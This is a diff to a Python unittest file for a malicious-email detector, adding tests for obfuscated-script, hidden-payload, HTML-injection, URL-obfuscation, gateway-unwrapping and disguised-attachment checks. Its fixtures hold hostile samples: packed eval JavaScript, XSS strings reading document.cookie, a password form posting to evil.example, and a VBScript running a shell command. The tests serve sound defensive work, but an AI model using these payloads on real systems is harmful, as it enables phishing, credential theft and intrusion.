@@ -348,7 +348,10 @@ class PipelineTests(unittest.TestCase):
         self.assertEqual(sum(len(y) for _, y in arrays.values()), len(frame))
         from preprocess import BASELINE_FEATURE_NAMES, FEATURE_NAMES, baseline_feature_vector, extract_baseline_features
         from pipeline_cache import _process
-        self.assertEqual(len(BASELINE_FEATURE_NAMES), len(FEATURE_NAMES) + 59)  # 53 + 21 header, 14 link, 11 attachment, 13 HTML
+        # 52 + 21 header, 14 link, 11 attachment, 13 HTML/script, 23 HTML payload
+        self.assertEqual(len(BASELINE_FEATURE_NAMES), len(FEATURE_NAMES) + 82)
+        self.assertNotIn('is_html', BASELINE_FEATURE_NAMES)  # the gate for the HTML checks, not an input
+        self.assertNotIn('html_to_text_ratio', BASELINE_FEATURE_NAMES)  # > 0 exactly when HTML: same proxy
         self.assertEqual(settings['feature_names'], BASELINE_FEATURE_NAMES)
         for X, y in arrays.values():
             self.assertEqual(X.shape, (len(y), 100 + len(BASELINE_FEATURE_NAMES)))
@@ -756,6 +759,81 @@ class PipelineTests(unittest.TestCase):
         self.assertEqual(flags.any(axis=1).to_list(), [True, False, False])
         self.assertTrue(flags.loc[0, 'lnk_command'] and flags.loc[0, 'double_extension'])
         self.assertIsNone(attachment_rule_flags(X, {'settings': {'feature_names': ['old'], 'doc2vec_dim': 100}}, self.root))
+        # A run from before obfuscated_script keeps the attachment rules it has features for.
+        old = [n for n in BASELINE_FEATURE_NAMES if n != 'html_js_obfuscated']
+        old_X = np.delete(X, 100 + BASELINE_FEATURE_NAMES.index('html_js_obfuscated'), axis=1)
+        old_scaler = StandardScaler().fit(np.delete(rows, BASELINE_FEATURE_NAMES.index('html_js_obfuscated'), axis=1))
+        (self.root / 'feature_scaler.pkl').write_bytes(__import__('pickle').dumps(old_scaler))
+        old_flags = attachment_rule_flags(old_X, {'settings': {'feature_names': old, 'doc2vec_dim': 100}}, self.root)
+        self.assertNotIn('obfuscated_script', old_flags)
+        self.assertEqual(old_flags.any(axis=1).to_list(), [True, False, False])
+
+    def test_html_payload_features_flag_obfuscated_script_hidden_payload_and_injection(self):
+        from preprocess import assess_attachment_rules, extract_html_check_features, extract_html_payload_features
+        # is_html gates the checks: script-looking plain text is not HTML and is not analysed.
+        self.assertFalse(any(extract_html_check_features('').values()))
+        plain = EmailMessage(); plain['From'] = 'a@example.org'; plain['To'] = 'b@example.org'
+        plain.set_content('Paste this: eval(function(p,a,c,k,e,d){return p})')
+        self.assertEqual(assess_attachment_rules(plain.as_bytes()), [])
+        def html_email(markup):
+            msg = EmailMessage(); msg['From'] = 'Shop <news@shop.example.com>'; msg['To'] = 'b@example.org'
+            msg['Subject'] = 'Update'; msg.set_content(markup, subtype='html')
+            return msg.as_bytes()
+        newsletter = ('<html><head><style>.preheader{display:none}</style><script type="application/ld+json">'
+                      '{"@context":"http://schema.org","@type":"Order"}</script></head><body>'
+                      '<span class="preheader">Your order has shipped</span>'
+                      '<div style="display:none;mso-hide:all"><a href="https://shop.example.com/m">Menu</a></div>'
+                      '<a href="https://shop.example.com/track?id=1&amp;utm_source=mail">Track</a>'
+                      '<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;help@shop.example.com">Help</a>'
+                      '<img src="https://img.example.com/p.png" width="1" height="1"><img height="8</td"></body></html>')
+        self.assertFalse(any(extract_html_payload_features(newsletter).values()))
+        self.assertEqual(assess_attachment_rules(html_email(newsletter)), [])
+        # Obfuscated JavaScript is decisive on its own; one weak sign (string splitting) is not.
+        packed = "<script>eval(function(p,a,c,k,e,d){return p}('0',1,1,'x'.split('|'),0,{}))</script>"
+        charcode = '<script>eval(String.fromCharCode(' + ','.join(['104'] * 30) + '))</script>'
+        escaped = '<script>var s="' + '\\x68' * 25 + '";document.write(unescape(s))</script>'
+        split = '<script>var u="ht"+"tp"+"s:"+"//"+"ev"+"il"+"."+"co"+"m/"+"x";location.href=u</script>'
+        for markup in (packed, charcode, escaped):
+            self.assertEqual(extract_html_payload_features(markup)['html_js_obfuscated'], 1.0, markup[:40])
+            self.assertEqual(assess_attachment_rules(html_email(f'<p>Hi</p>{markup}')), ['obfuscated_script'])
+        weak = extract_html_payload_features(split)
+        self.assertEqual((weak['html_js_obfuscated'], weak['html_js_redirect_count']), (0.0, 1.0))
+        self.assertGreaterEqual(weak['html_js_string_concat_count'], 8)
+        hidden = extract_html_payload_features(
+            '<p>Hello</p><div style="display:none">' + 'QmFzZTY0IHBheWxvYWQg' * 6 +
+            ' <a href="https://attacker.example/c">x</a><script>eval(atob("YQ=="))</script></div>'
+            '<input type="hidden" value="aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgdG9rZW4xMjM0NTY3ODkwYWJjZGVm">'
+            '<a href="https://bank.example/">Bank</a>')
+        self.assertEqual({k: hidden[k] for k in ('html_hidden_offsite_url_count', 'html_hidden_encoded_payload_count',
+                                                 'html_hidden_script_count')},
+                         {'html_hidden_offsite_url_count': 1.0, 'html_hidden_encoded_payload_count': 1.0,
+                          'html_hidden_script_count': 1.0})  # the hidden <script>; its code goes to the JS checks
+        self.assertGreaterEqual(hidden['html_hidden_high_entropy_count'], 1)
+        urls = extract_html_payload_features(
+            '<a href="&#106;avascript:alert(1)">a</a><a href="java&#9;script:alert(2)">b</a>'
+            '<a href="https://paypal.com@evil.example/">c</a><a href="http://0x7f000001/">d</a>'
+            '<a href="https:\\\\evil.example">e</a><a href="https://ev%69l.example/">f</a>'
+            '<iframe src="data:text/html;base64,PHNjcmlwdD4="></iframe><form action="https://collect.example/p">'
+            '<input type="password"></form><meta http-equiv="refresh" content="0;url=https://evil.example">'
+            '<base href="https://evil.example/">')
+        self.assertEqual([urls[k] for k in ('html_url_dangerous_scheme_count', 'html_url_obfuscated_count',
+                                            'html_form_remote_action_count', 'html_meta_refresh_count',
+                                            'html_base_href_count')], [3.0, 6.0, 1.0, 1.0, 1.0])
+        injection = extract_html_payload_features(
+            '<a href="https://trusted.example/s?q=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E">s</a>'
+            '<img alt="x&quot; onerror=&quot;alert(1)" src="a.png"><div title="<script>alert(1)</script>">t</div>'
+            '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p><object data="x.swf"></object><svg onload="alert(1)"></svg>'
+            '<div style="width:expression(alert(1))">e</div>')
+        self.assertEqual([injection[k] for k in ('html_injection_url_payload_count', 'html_injection_attr_markup_count',
+                                                 'html_dangerous_tag_count', 'html_css_injection_count')],
+                         [1.0, 2.0, 2.0, 1.0])
+        self.assertGreaterEqual(injection['html_encoded_markup_count'], 2)
+
+    def test_naive_bayes_is_not_a_candidate(self):
+        from train import build_candidates
+        names = build_candidates(np.array([0, 0, 1, 1]))
+        self.assertNotIn('Naive Bayes', names)
+        self.assertEqual(len(names), 9)
 
     def test_attachment_payload_features_are_static_and_bounded(self):
         import io, zipfile
@@ -798,6 +876,69 @@ class PipelineTests(unittest.TestCase):
             macro = extract_attachment_payload_features(doc.as_bytes())
         self.assertEqual((macro['attachment_vba_autoexec_count'], macro['attachment_vba_suspicious_count'],
                           macro['attachment_vba_stomping_count']), (1, 3, 1))
+
+    def test_gateway_rewrites_are_undone_and_cloud_file_links_stay_evidence(self):
+        from preprocess import (unwrap_gateway_url, cloud_file_provider, extract_email_urls, extract_link_features,
+                                extract_content_indicators, CONTENT_INDICATOR_NAMES, BASELINE_FEATURE_NAMES)
+        target = 'https://evil.example/login'
+        safelinks = 'https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fevil.example%2Flogin&data=05%7C01'
+        self.assertEqual(unwrap_gateway_url(safelinks), target)
+        self.assertEqual(unwrap_gateway_url('https://urldefense.proofpoint.com/v2/url?u=https-3A__evil.example_a-2Db&d=DwMF'),
+                         'https://evil.example/a-b')
+        self.assertEqual(unwrap_gateway_url('https://urldefense.com/v3/__https://evil.example/login__;!!AbC$'), target)
+        nested = 'https://linkprotect.cudasvc.com/url?a=' + __import__('urllib.parse').parse.quote(safelinks, safe='')
+        self.assertEqual(unwrap_gateway_url(nested), target)
+        # Sender-side redirects are the open-redirect signal and stay as they are.
+        google = 'https://www.google.com/url?q=https://evil.example/login'
+        self.assertEqual(unwrap_gateway_url(google), google)
+
+        def html_email(href, sender='it@example.org'):
+            msg = EmailMessage(); msg['From'] = sender; msg['To'] = 'b@example.org'; msg['Subject'] = 'Shared file'
+            msg.set_content('see the file')
+            msg.add_alternative(f'<html><body><a href="{href}">{target}</a></body></html>', subtype='html')
+            return msg.as_bytes()
+        wrapped = html_email(safelinks.replace('&', '&amp;'))
+        self.assertEqual(extract_email_urls(wrapped), [target])
+        self.assertEqual(extract_link_features(wrapped)['link_open_redirect_count'], 0)
+        self.assertEqual(extract_link_features(html_email(google))['link_open_redirect_count'], 1)
+
+        for url, provider in (('https://drive.google.com/file/d/1AbC/view?usp=drive_web', 'google_drive'),
+                              ('https://contoso-my.sharepoint.com/:b:/g/personal/a/EaBc', 'onedrive_sharepoint'),
+                              ('https://www.dropbox.com/scl/fi/abc/invoice.pdf?dl=0', 'dropbox'),
+                              ('https://we.tl/t-AbC123', 'wetransfer'),
+                              ('https://www.icloud.com/attachment/?u=x', 'icloud'),
+                              ('https://drive.google.com/', ''), ('https://wetransfer.com/pricing', '')):
+            self.assertEqual(cloud_file_provider(url), provider, url)
+        share = html_email('https://drive.google.com/file/d/1AbC/view', 'Drive <drive-shares-dm-noreply@google.com>')
+        values = extract_content_indicators(share)
+        self.assertEqual((values['cloud_file_link_count'], values['cloud_share_notification']), (1, 1))
+        # Legitimate corpora predate cloud sharing: never a model input.
+        self.assertFalse({'cloud_file_link_count', 'cloud_share_notification'} & set(BASELINE_FEATURE_NAMES))
+        self.assertEqual(list(values), CONTENT_INDICATOR_NAMES)
+
+    def test_magika_flags_active_content_named_as_a_document(self):
+        from preprocess import (inspect_email_attachments, extract_attachment_features, attachment_content_type,
+                                assess_attachment_rules)
+        page = (b'<!DOCTYPE html><html><head><title>Sign in</title></head><body><form action="https://evil.example/p" '
+                b'method="post"><input type="email" name="u"><input type="password" name="p">'
+                b'<button>Open document</button></form><script>document.forms[0].u.focus();</script></body></html>')
+        vbs = b'Set sh = CreateObject("WScript.Shell")\nsh.Run "cmd /c calc", 0\nDim x\nx = 1\n'
+        pdf = b'%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n'
+        self.assertEqual((attachment_content_type(page), attachment_content_type(pdf)), ('html', 'pdf'))
+        msg = EmailMessage(); msg['From'] = 'a@example.org'; msg['To'] = 'b@example.org'
+        msg.set_content('Invoice attached.')
+        for payload, name, subtype in ((page, 'invoice.pdf', 'pdf'), (vbs, 'photo.jpg', 'octet-stream'),
+                                       (pdf, 'report.pdf', 'pdf'), (page, 'newsletter.html', 'octet-stream')):
+            msg.add_attachment(payload, maintype='application', subtype=subtype, filename=name)
+        reports = {r['filename']: r for r in inspect_email_attachments(msg.as_bytes())}
+        self.assertIn('disguised_active_content', reports['invoice.pdf']['indicators'])
+        self.assertIn('disguised_active_content', reports['photo.jpg']['indicators'])
+        self.assertNotIn('disguised_active_content', reports['report.pdf']['indicators'])
+        self.assertNotIn('disguised_active_content', reports['newsletter.html']['indicators'])  # honest name
+        self.assertEqual(reports['report.pdf']['content_type'], 'pdf')
+        self.assertEqual(extract_attachment_features(msg.as_bytes())['attachment_disguised_active_count'], 2)
+        self.assertIn('disguised_active_content', assess_attachment_rules(msg.as_bytes()))
+        self.assertEqual(extract_attachment_features(email_bytes(3))['attachment_disguised_active_count'], 0)
 
 
 if __name__ == '__main__':
